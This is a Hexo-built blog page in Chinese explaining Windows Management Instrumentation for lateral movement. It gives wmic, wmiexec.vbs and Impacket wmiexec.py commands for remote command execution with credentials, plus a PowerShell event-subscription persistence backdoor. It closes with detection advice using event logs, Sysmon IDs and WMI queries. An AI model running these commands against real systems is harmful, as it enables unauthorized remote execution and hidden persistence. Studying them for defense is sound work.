@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="SeikoSrp">
+
+
+
+
+
+
+<title>深入理解WMI | a blog</title>
+
+
+
+    <link rel="icon" href="/haidao.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search');
+        const menuToggle = $('.menu-toggle');
+        const title = $('.navbar-header-title');
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+            menuToggle.addClass("open-search")
+            title.addClass("mobile-title-hidden")
+        } else {
+            search.removeClass("mobile-search");
+            menuToggle.removeClass("open-search")
+            // title.css({visibility: 'visible'})
+            title.removeClass("mobile-title-hidden")
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        // console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+<!-- Chic/layout.ejs -->
+ <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">SeikoSrp&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                <!-- 这里表示的是pc端搜索框 -->
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">SeikoSrp&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">前往底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部折叠"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">深入理解WMI</h1>
+            
+                <div class="post-meta">
+                    
+                        作者: <a itemprop="author" rel="author" href="/">SeikoSrp</a>
+                    
+
+                    
+                        <span class="post-time">
+                        发布于: <a href="#">五月 12, 2021&nbsp;&nbsp;10:19:39</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="什么是WMI，它出现的意义是什么"><a href="#什么是WMI，它出现的意义是什么" class="headerlink" title="什么是WMI，它出现的意义是什么"></a>什么是WMI，它出现的意义是什么</h1><p>Windows Management Instrumentation（WMI）是自Windows NT 4.01和Windows 952起一直保持不变的一项强大技术。WMI存在于所有Windows操作系统上，由一组功能强大的工具组成，<code>用于在本地和远程管理Windows系统。</code></p>
+<p>看重点就是，它的存在就是为了方便IT运维人员远程管理计算机，所以被用作横向移动也不奇怪了。</p>
+<h1 id="常见的WMI攻击方式"><a href="#常见的WMI攻击方式" class="headerlink" title="常见的WMI攻击方式"></a>常见的WMI攻击方式</h1><p>首先WMI攻击需要目标开启135端口，并且需要攻击者使用的账号有WMI的执行权限</p>
+<h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><h3 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h3><p>使用windows自带的WMIC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.1.10 &#x2F;user:win7\administrator &#x2F;password:123456 process call create &quot;cmd.exe&quot; &#x2F;c ipconfig &gt; ip.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>wmiexec.vbs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">两种方式，一种是伪交互式的shell</span><br><span class="line">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.1.10 administrator admin123</span><br><span class="line">一种是直接执行命令</span><br><span class="line">cscript.exe wmiexec.vbs &#x2F;cmd 192.168.1.10 administrator admin123! &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Impacket中的WMIexec.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里密码如果带有特殊字符则需要用双引号括起来</span><br><span class="line">python wmiexec.py dev&#x2F;administrator:&quot;admin123!&quot;@192.168.254.161</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%B3%BB%E5%88%97_%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3WMI.assets/image-20210512183358236.png" alt="image-20210512183358236"></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>通过通过Win32_Process类的Create方法，直接执行命令</p>
+<h2 id="通过WMI建立后门"><a href="#通过WMI建立后门" class="headerlink" title="通过WMI建立后门"></a>通过WMI建立后门</h2><h3 id="手法-1"><a href="#手法-1" class="headerlink" title="手法"></a>手法</h3><p>使用WMI可做后门，其中主要的方式不是通过Win32_Process的Create方法，目前已知的通过WMI做后门的方式都是参考自Blackhat2015中提出的通过事件过滤器的利用方式：</p>
+<p>Empire后门</p>
+<p><a href="https://zhuanlan.zhihu.com/p/255065815" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/255065815</a></p>
+<p>检测并清除：</p>
+<p><a href="https://xz.aliyun.com/t/2873" target="_blank" rel="noopener">https://xz.aliyun.com/t/2873</a></p>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>事件主要通过WMI中提供的事件、事件消费者、事件绑定类来实现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__EventFilter</span><br><span class="line">	事件过滤器,接收事件查询参数,WMI中的事件非常多，可以通过WQL语句触发事件</span><br><span class="line">__EventConsumer</span><br><span class="line">	事件消费者，也就是事件在触发时做执行操作的类，包括下面这些，但是这些类都是继承自__EventConsumer：</span><br><span class="line">        LogFileEventConsumer： 将事件数据写入到指定的日志文件</span><br><span class="line">        ActiveScriptEventConsumer： 用来执行VBScript&#x2F;JScript程序</span><br><span class="line">        NTEventLogEventConsumer：创建一个包含事件数据的日志入口点</span><br><span class="line">        SMTPEventConsumer：将事件数据用邮件发送</span><br><span class="line">        CommandLineEventConsumer：执行一条命令</span><br><span class="line">__FilterToConsumerBinding</span><br><span class="line">	必须将事件过滤器和事件消费者两者绑定，在产生事件时消费者才会执行操作</span><br></pre></td></tr></table></figure>
+
+<p>议题中的例子：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">filterName = <span class="string">'BotFilter82'</span></span><br><span class="line">consumerName = <span class="string">'BotConsumer23'</span></span><br><span class="line">exePath = <span class="string">'C:\Windows\System32\evil.exe'</span></span><br><span class="line">Query = <span class="string">"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;=200  AND TargetInstance.SystemUpTime &lt; 320"</span></span><br><span class="line"></span><br><span class="line">WMIEventFilter = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> __EventFilter <span class="literal">-NameSpace</span> <span class="string">"root\subscription"</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;Name=<span class="variable">$filterName</span>;EventNameSpace=<span class="string">"root\cimv2"</span>;QueryLanguage=<span class="string">"WQL"</span>;Query=<span class="variable">$Query</span>&#125; <span class="literal">-ErrorAction</span> Stop</span><br><span class="line"></span><br><span class="line">WMIEventConsumer = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> CommandLineEventConsumer <span class="literal">-Namespace</span> <span class="string">"root\subscription"</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;Name=<span class="variable">$consumerName</span>;ExecutablePath=<span class="variable">$exePath</span>;CommandLineTemplate=<span class="variable">$exePath</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-Namespace</span> <span class="string">"root\subscription"</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;<span class="keyword">Filter</span>=<span class="variable">$WMIEventFilter</span>;Consumer=<span class="variable">$WMIEventConsumer</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的查询语句可以参考链接：</p>
+<p>主要就是定时(每60s)查询计算机的性能计数器，当满足查询语句时事件被触发，事件消费者中的文件被执行。</p>
+<h2 id="WMI的回显问题"><a href="#WMI的回显问题" class="headerlink" title="WMI的回显问题"></a>WMI的回显问题</h2><p>默认情况下通过WMI执行代码是不会有回显的，其中有部分脚本实现了shell类型的和有回显的执行代码的方式，比如impacket中的wmiexec.py还有wmiexec.vbs直接做成了类似于反弹shell的形式。</p>
+<p>下面的这个文章举了一些例子：</p>
+<p><a href="https://www.4hou.com/posts/ojVY" target="_blank" rel="noopener">https://www.4hou.com/posts/ojVY</a></p>
+<h3 id="通过创建wmi对象存储数据"><a href="#通过创建wmi对象存储数据" class="headerlink" title="通过创建wmi对象存储数据"></a>通过创建wmi对象存储数据</h3><p>比如网上的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">StaticClass &#x3D; New-Object Management.ManagementClass(&#39;root\cimv2&#39;, $null, $null)</span><br><span class="line">StaticClass.Name &#x3D; &#39;Win32_EvilClass&#39;</span><br><span class="line">StaticClass.Put()</span><br><span class="line">StaticClass.Properties.Add(&#39;EvilProperty&#39;, &quot;This is not the malware you&#39;re looking for&quot;)</span><br><span class="line">StaticClass.Put()</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过注册表存储"><a href="#通过注册表存储" class="headerlink" title="通过注册表存储"></a>通过注册表存储</h3><p>WMI可以实现远程操作注册表，其中<code>root\DEFAULT:StdRegProv</code>类就可以实现远程操作注册表项</p>
+<h1 id="防御与检测"><a href="#防御与检测" class="headerlink" title="防御与检测"></a>防御与检测</h1><h2 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a>后门排查</h2><p>直接powershell执行下面命令，查看以下三种类型的类是否存在</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Event Filter</span></span><br><span class="line"><span class="built_in">Get-WMIObject</span> <span class="literal">-Namespace</span> root\Subscription <span class="literal">-Class</span> __EventFilter <span class="literal">-Filter</span> <span class="string">"Name='Updater'"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Event Consumer</span></span><br><span class="line"><span class="built_in">Get-WMIObject</span> <span class="literal">-Namespace</span> root\Subscription <span class="literal">-Class</span> CommandLineEventConsumer <span class="literal">-Filter</span> <span class="string">"Name='Updater'"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Binding</span></span><br><span class="line"><span class="built_in">Get-WMIObject</span> <span class="literal">-Namespace</span> root\Subscription <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-Filter</span> <span class="string">"__Path LIKE '%Updater%'"</span></span><br></pre></td></tr></table></figure>
+
+<p>网上也说到使用Autoruns，其实原理是一样的</p>
+<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>可以参考：<a href="https://bbs.pediy.com/thread-254123.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-254123.htm</a></p>
+<h3 id="Windows事件日志："><a href="#Windows事件日志：" class="headerlink" title="Windows事件日志："></a>Windows事件日志：</h3><p>事件5861代表新创建的consumer</p>
+<p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%B3%BB%E5%88%97_%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3WMI.assets/image-20210514235529701.png" alt="image-20210514235529701"></p>
+<p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%B3%BB%E5%88%97_%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3WMI.assets/image-20210515000638785.png" alt="image-20210515000638785"></p>
+<h3 id="sysmon日志："><a href="#sysmon日志：" class="headerlink" title="sysmon日志："></a>sysmon日志：</h3><p>sysmon内置了关于wmi的三种类型的事件日志：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sysmon事件ID 19：WmiEvent（检测到了WmiEventFilter的活动）</span><br><span class="line">Sysmon事件ID 20：WmiEvent（检测到了WmiEventConsumer的活动）</span><br><span class="line">Sysmon事件ID 21：WmiEvent（检测到了WmiEventConsumerToFilter的活动）</span><br></pre></td></tr></table></figure>
+
+<h3 id="进程级别检测："><a href="#进程级别检测：" class="headerlink" title="进程级别检测："></a>进程级别检测：</h3><p>进程链中，可以看到通过wmi启动了powershell.exe进程。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">下图左上角，进程链中，可以看到通过wmi启动了powershell.exe进程。</span><br><span class="line"></span><br><span class="line">下图右上角，如果我们想通过powershell执行命令在一台远程机器上的时候，本地的进程是powershell.exe，远程机器上出现的进程就是wsmprovhost.exe</span><br><span class="line"></span><br><span class="line">下图左下角，和上面一样，通过远程执行WMI命令时，本地可能是通过wmic.exe，在远程机器上出现的进程就是wmiprvse.exe</span><br><span class="line"></span><br><span class="line">下图右下角，可以看到有人在这台机器上远程执行powershell命令，通过进程链的sc.exe可以知道是在执行和服务相关的命令。</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%B3%BB%E5%88%97_%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3WMI.assets/image-20210515000121704.png" alt="image-20210515000121704"></p>
+<h3 id="检测WMI对象："><a href="#检测WMI对象：" class="headerlink" title="检测WMI对象："></a>检测WMI对象：</h3><p>通过WMI对象留后门会出现除了系统默认之外的类或者命名空间</p>
+<h3 id="流量检测："><a href="#流量检测：" class="headerlink" title="流量检测："></a>流量检测：</h3><p>发现每种类型都有不一样的流量特征，需要一个一个的去分析</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2021/05-19-0Day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98_3.4_%E6%9E%84%E9%80%A0%E5%8A%A8%E6%80%81%E5%AE%9A%E4%BD%8D%E7%B3%BB%E7%BB%9FAPI%E7%9A%84shellcode/">0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode</a>
+            
+            
+            <a class="next" rel="next" href="/2021/05-07-0day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98_3.4_%E5%AE%9A%E4%BD%8D%E5%AF%BC%E5%87%BA%E5%9C%B0%E5%9D%80%E8%A1%A8/">0day漏洞挖掘_3.4_定位导出地址表</a>
+            
+        </section>
+	
+		<section id="comments" class="comments">
+		  <style>
+			.comments{margin:30px;padding:10px;background:#fff}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+		  </style>
+		  <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'ehQ0k7G3fcpwmkyxhG8U6DzL-gzGzoHsz',
+      app_key: 'AwwXGgbdqswiimAY0qJYhtRa',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+		</section>
+	
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© SeikoSrp | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
